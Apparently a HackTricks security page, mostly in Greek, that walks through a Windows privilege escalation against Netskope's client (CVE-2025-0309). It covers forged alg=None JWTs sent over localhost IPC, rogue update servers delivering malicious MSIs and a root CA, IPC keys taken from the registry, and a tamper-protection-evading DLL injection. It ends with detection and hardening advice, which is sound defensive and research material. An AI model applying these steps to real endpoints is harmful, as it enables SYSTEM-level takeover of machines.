# Abusing Enterprise Auto-Updaters and Privileged IPC (e.g., Netskope stAgentSvc)

{{#include ../../banners/hacktricks-training.md}}

Αυτή η σελίδα γενικεύει μια κατηγορία Windows local privilege escalation αλυσίδων που βρέθηκαν σε enterprise endpoint agents και updaters οι οποίοι εκθέτουν μια χαμηλού τριβής IPC επιφάνεια και μια privileged update ροή. Ένα αντιπροσωπευτικό παράδειγμα είναι ο Netskope Client for Windows < R129 (CVE-2025-0309), όπου ένας χρήστης με χαμηλά δικαιώματα μπορεί να αναγκάσει enrollment σε έναν attacker‑controlled server και έπειτα να παραδώσει ένα malicious MSI που η SYSTEM υπηρεσία εγκαθιστά.

Κύριες ιδέες που μπορείτε να επαναχρησιμοποιήσετε ενάντια σε παρόμοια προϊόντα:
- Κατάχρηση της privileged υπηρεσίας μέσω localhost IPC για να επιβληθεί ξανά re‑enrollment ή reconfiguration σε έναν attacker server.
- Υλοποίηση των update endpoints του vendor, παράδοση ενός rogue Trusted Root CA, και δρομολόγηση του updater σε ένα malicious, “signed” πακέτο.
- Παράκαμψη αδύναμων ελέγχων signer (CN allow‑lists), προαιρετικών digest flags, και lax MSI properties.
- Αν το IPC είναι “encrypted”, παράγωγη του key/IV από world‑readable machine identifiers που αποθηκεύονται στο registry.
- Αν η υπηρεσία περιορίζει τους καλούντες με βάση image path/process name, injekt σε ένα allow‑listed process ή spawn ένα suspended και bootstrap το DLL σας μέσω ενός minimal thread‑context patch.

---
## 1) Forcing enrollment to an attacker server via localhost IPC

Πολλές agents περιλαμβάνουν μια user‑mode UI διεργασία που συνομιλεί με μια SYSTEM υπηρεσία μέσω localhost TCP χρησιμοποιώντας JSON.

Παρατηρήθηκε σε Netskope:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Exploit flow:
1) Συνθέστε ένα JWT enrollment token των οποίων τα claims ελέγχουν τον backend host (π.χ., AddonUrl). Χρησιμοποιήστε alg=None ώστε να μην απαιτείται signature.
2) Στείλτε το IPC μήνυμα που καλεί την provisioning εντολή με το JWT σας και το tenant name:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) Η υπηρεσία αρχίζει να κάνει αιτήσεις στον rogue server σας για enrollment/config, π.χ.:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Notes:
- If caller verification is path/name‑based, originate the request from a allow‑listed vendor binary (see §4).

---
## 2) Κατάληψη του καναλιού ενημέρωσης για εκτέλεση κώδικα ως SYSTEM

Μόλις ο client επικοινωνήσει με τον server σας, υλοποιήστε τα αναμενόμενα endpoints και κατευθύνετέ τον σε έναν attacker MSI. Τυπική ακολουθία:

1) /v2/config/org/clientconfig → Επιστρέψτε JSON config με πολύ μικρό updater interval, π.χ.:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → Επιστρέφει ένα PEM CA certificate. Η υπηρεσία το εγκαθιστά στο Local Machine Trusted Root store.
3) /v2/checkupdate → Παρέχει metadata που δείχνει σε ένα malicious MSI και μια ψεύτικη έκδοση.

Παράκαμψη κοινών ελέγχων που συναντώνται στο wild:
- Signer CN allow‑list: η υπηρεσία μπορεί να ελέγχει μόνο αν το Subject CN ισούται με “netSkope Inc” ή “Netskope, Inc.”. Ο rogue CA σας μπορεί να εκδώσει ένα leaf με εκείνο το CN και να υπογράψει το MSI.
- CERT_DIGEST property: συμπεριλάβετε ένα benign MSI property με το όνομα CERT_DIGEST. Δεν εφαρμόζεται enforcement κατά την εγκατάσταση.
- Optional digest enforcement: flag στο config (π.χ., check_msi_digest=false) απενεργοποιεί επιπλέον cryptographic validation.

Αποτέλεσμα: η SYSTEM service εγκαθιστά το MSI σας από
C:\ProgramData\Netskope\stAgent\data\*.msi
εκτελώντας arbitrary code ως NT AUTHORITY\SYSTEM.

---
## 3) Forging encrypted IPC requests (when present)

Από R127, το Netskope τύλιξε το IPC JSON σε ένα encryptData field που μοιάζει με Base64. Αντίστροφη ανάλυση έδειξε AES με key/IV παράγωγα από registry τιμές αναγνώσιμες από οποιονδήποτε χρήστη:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Οι attackers μπορούν να αναπαράγουν την κρυπτογράφηση και να στείλουν έγκυρες encrypted εντολές από έναν standard user. Γενική συμβουλή: αν ένας agent ξαφνικά “encrypts” το IPC του, ψάξτε για device IDs, product GUIDs, install IDs κάτω από HKLM ως υλικό κλειδιού.

---
## 4) Bypassing IPC caller allow‑lists (path/name checks)

Κάποιες υπηρεσίες προσπαθούν να αυθεντικοποιήσουν το peer επιλύοντας το PID της TCP σύνδεσης και συγκρίνοντας το image path/name με allow‑listed vendor binaries κάτω από Program Files (π.χ., stagentui.exe, bwansvc.exe, epdlp.exe).

Δύο πρακτικές παρακάμψεις:
- DLL injection σε ένα allow‑listed process (π.χ., nsdiag.exe) και proxy IPC από μέσα του.
- Spawn ενός allow‑listed binary suspended και bootstrap του proxy DLL σας χωρίς CreateRemoteThread (βλ. §5) για να ικανοποιήσετε driver‑enforced tamper κανόνες.

---
## 5) Tamper‑protection friendly injection: suspended process + NtContinue patch

Τα προϊόντα συχνά συνοδεύονται από έναν minifilter/OB callbacks driver (π.χ., Stadrv) που αφαιρεί επικίνδυνα δικαιώματα από handles προς protected processes:
- Process: αφαιρεί PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: περιορίζει σε THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

Ένας αξιόπιστος user‑mode loader που σέβεται αυτούς τους περιορισμούς:
1) CreateProcess ενός vendor binary με CREATE_SUSPENDED.
2) Λήψη handles που εξακολουθείτε να δικαιούστε: PROCESS_VM_WRITE | PROCESS_VM_OPERATION για τη διαδικασία, και ένα thread handle με THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (ή απλά THREAD_RESUME αν κάνετε patch σε γνωστό RIP).
3) Υπερκάλυψη του ntdll!NtContinue (ή άλλου early, guaranteed‑mapped thunk) με ένα μικρό stub που καλεί LoadLibraryW στο path του DLL σας, και μετά κάνει jump πίσω.
4) ResumeThread για να ενεργοποιήσει το stub εντός της διεργασίας, φορτώνοντας το DLL σας.

Επειδή ποτέ δεν χρησιμοποιήσατε PROCESS_CREATE_THREAD ή PROCESS_SUSPEND_RESUME σε μια ήδη‑protected διεργασία (εσείς τη δημιουργήσατε), η πολιτική του driver ικανοποιείται.

---
## 6) Practical tooling
- NachoVPN (Netskope plugin) αυτοματοποιεί έναν rogue CA, malicious MSI signing, και εξυπηρετεί τα απαιτούμενα endpoints: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.
- UpSkope είναι ένας custom IPC client που κατασκευάζει arbitrary (προαιρετικά AES‑encrypted) IPC messages και περιλαμβάνει την suspended‑process injection για να προέρχονται από ένα allow‑listed binary.

---
## 7) Detection opportunities (blue team)
- Εποπτεύετε προσθήκες στο Local Machine Trusted Root. Sysmon + registry‑mod eventing (βλ. SpecterOps guidance) δουλεύει καλά.
- Σηματοποιήστε MSI executions που ξεκινούν από την agent’s service από μονοπάτια σαν C:\ProgramData\<vendor>\<agent>\data\*.msi.
- Ελέγξτε τα logs του agent για απροσδόκητα enrollment hosts/tenants, π.χ.: C:\ProgramData\netskope\stagent\logs\nsdebuglog.log – ψάξτε για addonUrl / tenant anomalies και provisioning msg 148.
- Alert για localhost IPC clients που δεν είναι τα αναμενόμενα signed binaries, ή που προέρχονται από ασυνήθιστα child process trees.

---
## Hardening tips for vendors
- Bind enrollment/update hosts σε αυστηρή allow‑list; απορρίψτε untrusted domains σε clientcode.
- Authenticate IPC peers με OS primitives (ALPC security, named‑pipe SIDs) αντί για ελέγχους image path/name.
- Κρατήστε secret material μακριά από world‑readable HKLM; αν το IPC πρέπει να κρυπτογραφείται, παράγετε keys από protected secrets ή διαπραγματευτείτε πάνω σε authenticated κανάλια.
- Αντιμετωπίστε τον updater ως supply‑chain surface: απαιτήστε πλήρη chain σε ένα trusted CA που ελέγχετε, verify package signatures έναντι pinned keys, και fail closed αν το validation είναι απενεργοποιημένο στο config.

## References
- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)

{{#include ../../banners/hacktricks-training.md}}
